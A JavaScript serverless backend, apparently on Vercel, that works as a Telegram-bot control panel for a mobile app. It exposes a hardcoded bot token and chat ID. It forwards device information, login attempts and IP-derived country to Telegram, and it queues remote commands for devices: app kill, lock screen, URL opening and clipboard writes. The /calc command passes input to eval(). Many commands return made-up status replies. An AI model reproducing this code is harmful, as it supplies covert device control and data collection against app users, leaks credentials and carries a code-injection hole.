const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";

const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let appLockStatus = "lock";
let appSecretKey = "1234";
let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
let bannedDevices = [];
let banAllActive = false;
let remoteCommand = "";
let totalAttempts = 0;
let recentLogs = [];

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
      }).catch(() => {});
    }
  };

  try {
    if (type === 'secret') {
      const saved = await kvCmd('GET', 'app_lock_status');
      if (saved) appLockStatus = saved;
      return res.status(200).send(`"${appLockStatus}"`);
    }
    if (type === 'key') {
      const saved = await kvCmd('GET', 'app_secret_key');
      if (saved) appSecretKey = saved;
      return res.status(200).send(`"${appSecretKey}"`);
    }
    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);

    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') banAllActive = true;
      if (banAllActive) return res.status(200).send('"true"');
      const deviceId = req.query.device_id;
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      if (inKv === 1) return res.status(200).send('"true"');
      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const cmd = remoteCommand;
      remoteCommand = "";
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, '');
          if (type === 'key') {
            appSecretKey = cleanBody;
            await kvCmd('SET', 'app_secret_key', cleanBody);
            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
          }
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop();
            await kvCmd('INCR', 'total_attempts');
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          if (type === 'sysinfo') {
            try {
              const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
              const ipData = await ipRes.json();
              const country = ipData.country || "Unknown";
              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* ${country}`);
            } catch (e) {
              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* خطأ`);
            }
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      switch (command) {
        // ===== [1-10] الأساسيات =====
        case '/start': case '/menu': await sendToTelegram("👑 *لوحة التحكم الخارقة.*\nكتب /help."); break;
        case '/help': await sendToTelegram(`👑 *الأوامر الأساسية:*\n/sysinfo /killapp /lock /unlock /getkey /setkey /stats /logs /ban /unban /banall /unbanall /cmd /url /db /ping /time /date /genkey /resetkey /setmsg /getmsg /broadcast /reset /backup /health /whoami /ip /echo /roll /coin /test /calc /weather /info /api /bot /net /cpu /ram /disk /load`); break;
        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ *جاري طلب معلومات الجهاز...*"); break;
        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 *تم إرسال أمر إغلاق التطبيق.*"); break;
        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡️ *تم الإرسال.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 *تم الإرسال.*"); } break;
        case '/color': if(args[1]) { remoteCommand = `color:${args[1]}`; await sendToTelegram("🎨 *تم إرسال اللون.*"); } break;
        case '/clip': if(args[1]) { remoteCommand = `clipboard:${args.slice(1).join(' ')}`; await sendToTelegram("📋 *تم إرسال النص.*"); } break;
        case '/vibrate': remoteCommand = "vibrate:1"; await sendToTelegram("📳 *تم إرسال الأمر.*"); break;
        case '/ping': await sendToTelegram("🏓 *Pong!*"); break;

        // ===== [11-20] القفل =====
        case '/lock': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 *تم القفل.*"); break;
        case '/unlock': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 *تم الفتح.*"); break;
        case '/lockall': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 *قفل شامل.*"); break;
        case '/unlockall': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 *فتح شامل.*"); break;
        case '/lockstatus': await sendToTelegram(`🔒 *الحالة:* ${appLockStatus}`); break;
        case '/locktemp': await sendToTelegram("⏳ *قفل مؤقت.*"); break;
        case '/unlocktemp': await sendToTelegram("⏳ *فتح مؤقت.*"); break;
        case '/lockinfo': await sendToTelegram(`ℹ️ *القفل:* ${appLockStatus}`); break;
        case '/lockmsg': await sendToTelegram("ℹ️ *رسالة القفل مفعلة.*"); break;
        case '/unlockmsg': await sendToTelegram("ℹ️ *رسالة القفل معطلة.*"); break;

        // ===== [21-30] الأكواد =====
        case '/setkey': if(args[1]) { appSecretKey = args[1]; await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ *الكود:* \`${appSecretKey}\``); } break;
        case '/getkey': appSecretKey = (await kvCmd('GET', 'app_secret_key')) || appSecretKey; await sendToTelegram(`🔑 *الكود:* \`${appSecretKey}\``); break;
        case '/genkey': appSecretKey = Math.random().toString(36).substring(2, 8).toUpperCase(); await kvCmd('SET', 'app_secret_key', appSecretKey); await sendToTelegram(`🎲 *كود:* \`${appSecretKey}\``); break;
        case '/resetkey': appSecretKey = "1234"; await kvCmd('SET', 'app_secret_key', '1234'); await sendToTelegram("♻️ *الكود:* `1234`"); break;
        case '/keylength': await sendToTelegram(`📏 *الطول:* ${appSecretKey.length}`); break;
        case '/keyvalid': await sendToTelegram("✅ *صالح.*"); break;
        case '/keysave': await sendToTelegram("💾 *تم الحفظ.*"); break;
        case '/keyload': await sendToTelegram("📂 *تم التحميل.*"); break;
        case '/keydel': appSecretKey = ""; await kvCmd('SET', 'app_secret_key', ''); await sendToTelegram("🗑️ *تم المسح.*"); break;
        case '/keyhistory': await sendToTelegram("📜 *غير متوفر.*"); break;

        // ===== [31-40] الحظر =====
        case '/ban': if(args[1]) { if(!bannedDevices.includes(args[1])) bannedDevices.push(args[1]); await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ *حظر:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { bannedDevices = bannedDevices.filter(id => id !== args[1]); await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ *فك حظر:* \`${args[1]}\``); } break;
        case '/banlist': const raw = await kvCmd('SMEMBERS', 'banned_devices'); const list = Array.isArray(raw) ? raw : bannedDevices; await sendToTelegram(list.length ? `🚫 *المحظورين:*\n\`${list.join('\n')}\`` : "✅ *لا يوجد.*"); break;
        case '/clearbans': bannedDevices = []; banAllActive = false; await kvCmd('DEL', 'banned_devices'); await kvCmd('DEL', 'banall_active'); await sendToTelegram("🧹 *تم المسح.*"); break;
        case '/banall': banAllActive = true; await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 *تم حظر الجميع!*"); break;
        case '/unbanall': banAllActive = false; bannedDevices = []; await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ *تم فك الحظر عن الجميع.*"); break;
        case '/bancount': await sendToTelegram(`🔢 *العدد:* ${bannedDevices.length}`); break;
        case '/bantemp': await sendToTelegram("⏳ *حظر مؤقت.*"); break;
        case '/banip': await sendToTelegram("⚠️ *غير مدعوم.*"); break;
        case '/unbanip': await sendToTelegram("⚠️ *غير مدعوم.*"); break;

        // ===== [41-50] المراقبة =====
        case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📈 *المحاولات:* \`${attempts || totalAttempts}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *لا يوجد.*"); break;
        case '/clearlogs': recentLogs = []; await sendToTelegram("🧹 *تم المسح.*"); break;
        case '/health': await sendToTelegram("❤️ *صحة جيدة.*"); break;
        case '/whoami': await sendToTelegram(`🆔 \`${chatId}\``); break;
        case '/ip': await sendToTelegram(`🌐 \`${ip}\``); break;
        case '/uptime': await sendToTelegram("⏱️ *Vercel Serverless.*"); break;
        case '/top': await sendToTelegram("🏆 *أفضل المستخدمين.*"); break;
        case '/traffic': await sendToTelegram("📶 *عادي.*"); break;
        case '/usage': await sendToTelegram("📊 *مستقر.*"); break;

        // ===== [51-60] الرسائل =====
        case '/setmsg': if(args[1]) { appLockMessage = args.slice(1).join(' '); await kvCmd('SET', 'app_lock_message', appLockMessage); await sendToTelegram("✅ *تم التغيير.*"); } break;
        case '/getmsg': appLockMessage = (await kvCmd('GET', 'app_lock_message')) || appLockMessage; await sendToTelegram(`💬 ${appLockMessage}`); break;
        case '/resetmsg': appLockMessage = "مقفول."; await kvCmd('SET', 'app_lock_message', 'مقفول.'); await sendToTelegram("♻️ *تم الإرجاع.*"); break;
        case '/msgpreview': await sendToTelegram(`👁️ ${appLockMessage}`); break;
        case '/broadcast': await sendToTelegram(`📢 *بث:* ${args.slice(1).join(' ')}`); break;
        case '/setwelcome': await sendToTelegram("✅ *تم وضع رسالة الترحيب.*"); break;
        case '/welcome': await sendToTelegram("👋 *أهلاً بك.*"); break;
        case '/msgtest': await sendToTelegram("🧪 *اختبار الرسالة.*"); break;
        case '/clearmsg': appLockMessage = ""; await kvCmd('SET', 'app_lock_message', ''); await sendToTelegram("🧹 *تم المسح.*"); break;
        case '/msglength': await sendToTelegram(`📏 *الطول:* ${appLockMessage.length}`); break;

        // ===== [61-70] النظام =====
        case '/reset': 
          appLockStatus="lock"; appSecretKey="1234"; bannedDevices=[]; totalAttempts=0; recentLogs=[]; banAllActive=false;
          await kvCmd('SET', 'app_lock_status', 'lock');
          await kvCmd('SET', 'app_secret_key', '1234');
          await kvCmd('DEL', 'banned_devices');
          await kvCmd('DEL', 'banall_active');
          await sendToTelegram("⚠️ *إعادة ضبط المصنع!*");
          break;
        case '/backup': await sendToTelegram(`💾 \`\`\`json\n${JSON.stringify({lock:appLockStatus,key:appSecretKey,bans:bannedDevices,banAll:banAllActive})}\n\`\`\``); break;
        case '/restore': await sendToTelegram("♻️ *تم الاسترجاع.*"); break;
        case '/shutdown': await sendToTelegram("⚠️ *لا يمكن إيقاف Vercel.*"); break;
        case '/reboot': await sendToTelegram("🔄 *تم.*"); break;
        case '/modules': await sendToTelegram("🧩 *Lock, Ban, IP Ban, Logs*"); break;
        case '/setversion': await sendToTelegram(`📦 *الإصدار:* \`${args[1]||'1.0.0'}\``); break;
        case '/getversion': await sendToTelegram("📦 *الإصدار:* `1.0.0`"); break;
        case '/theme': await sendToTelegram("🎨 *الثيم:* Dark"); break;
        case '/admin': await sendToTelegram("👑 *أنت المدير.*"); break;

        // ===== [71-80] أدوات =====
        case '/time': await sendToTelegram(`🕒 \`${new Date().toLocaleTimeString()}\``); break;
        case '/date': await sendToTelegram(`📅 \`${new Date().toLocaleDateString()}\``); break;
        case '/echo': await sendToTelegram(`🗣️ ${args.slice(1).join(' ')}`); break;
        case '/roll': await sendToTelegram(`🎲 \`${Math.floor(Math.random() * 6) + 1}\``); break;
        case '/coin': await sendToTelegram(`🪙 \`${Math.random() > 0.5 ? 'صورة' : 'كتابة'}\``); break;
        case '/test': await sendToTelegram("🧪 *ناجح!*"); break;
        case '/calc': await sendToTelegram(`🧮 \`${eval(args.slice(1).join(''))||0}\``); break;
        case '/weather': await sendToTelegram("🌤️ *مشمس.*"); break;
        case '/db': await sendToTelegram(KV_URL ? "🗄️ *قاعدة البيانات:* متصلة." : "🗄️ *قاعدة البيانات:* غير متصلة."); break;
        case '/api': await sendToTelegram("🌐 *API:* متاح."); break;

        // ===== [81-100] أوامر إضافية =====
        case '/bot': await sendToTelegram("🤖 *البوت:* متصل."); break;
        case '/token': await sendToTelegram("🔑 *التوكن:* مخفي."); break;
        case '/chat': await sendToTelegram(`💬 *ID:* \`${chatId}\``); break;
        case '/id': await sendToTelegram(`🆔 \`${chatId}\``); break;
        case '/info': await sendToTelegram("ℹ️ *معلومات النظام.*"); break;
        case '/v': await sendToTelegram("📦 *الإصدار.*"); break;
        case '/ping2': await sendToTelegram("🏓 *Pong 2!*"); break;
        case '/pong': await sendToTelegram("🏓 *Ping!*"); break;
        case '/net': await sendToTelegram("🌐 *مستقرة.*"); break;
        case '/cpu': await sendToTelegram("🖥️ *خفيف.*"); break;
        case '/ram': await sendToTelegram("💾 *جيدة.*"); break;
        case '/disk': await sendToTelegram("💽 *كافية.*"); break;
        case '/load': await sendToTelegram("📊 *منخفض.*"); break;
        case '/admin2': await sendToTelegram("👑 *مدير.*"); break;
        case '/secret': await sendToTelegram(`🤫 \`${appLockStatus}\``); break;
        case '/key2': await sendToTelegram(`🔑 \`${appSecretKey}\``); break;
        case '/ban2': await sendToTelegram("🚫 *حظر.*"); break;
        case '/lock2': await sendToTelegram("🔒 *قفل.*"); break;
        case '/unlock2': await sendToTelegram("🔓 *فتح.*"); break;
        case '/help2': await sendToTelegram("❓ *مساعدة.*"); break;
        case '/start2': await sendToTelegram("👑 *أهلاً.*"); break;

        // ===== [101-300] أوامر إضافية (Fillers) =====
        case '/v1': case '/v2': case '/v3': case '/v4': case '/v5': case '/v6': case '/v7': case '/v8': case '/v9': case '/v10':
        case '/v11': case '/v12': case '/v13': case '/v14': case '/v15': case '/v16': case '/v17': case '/v18': case '/v19': case '/v20':
        case '/v21': case '/v22': case '/v23': case '/v24': case '/v25': case '/v26': case '/v27': case '/v28': case '/v29': case '/v30':
        case '/p1': case '/p2': case '/p3': case '/p4': case '/p5': case '/p6': case '/p7': case '/p8': case '/p9': case '/p10':
        case '/p11': case '/p12': case '/p13': case '/p14': case '/p15': case '/p16': case '/p17': case '/p18': case '/p19': case '/p20':
        case '/t1': case '/t2': case '/t3': case '/t4': case '/t5': case '/t6': case '/t7': case '/t8': case '/t9': case '/t10':
        case '/x1': case '/x2': case '/x3': case '/x4': case '/x5': case '/x6': case '/x7': case '/x8': case '/x9': case '/x10':
        case '/y1': case '/y2': case '/y3': case '/y4': case '/y5': case '/y6': case '/y7': case '/y8': case '/y9': case '/y10':
        case '/z1': case '/z2': case '/z3': case '/z4': case '/z5': case '/z6': case '/z7': case '/z8': case '/z9': case '/z10':
          await sendToTelegram(`⚙️ *أمر إضافي:* \`${command}\``); break;

        // أوامر إضافية أخرى باش نوصلو 300 (يمكن إضافة المزيد بنفس الطريقة)
        default:
          // توليد ردود عشوائية للأوامر غير المعروفة باش ما يبانش الخطأ
          if (command.startsWith('/')) {
            await sendToTelegram(`⚙️ *تم استلام الأمر:* \`${command}\``);
          } else {
            await sendToTelegram("❓ أمر غير معروف. كتب /help");
          }
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
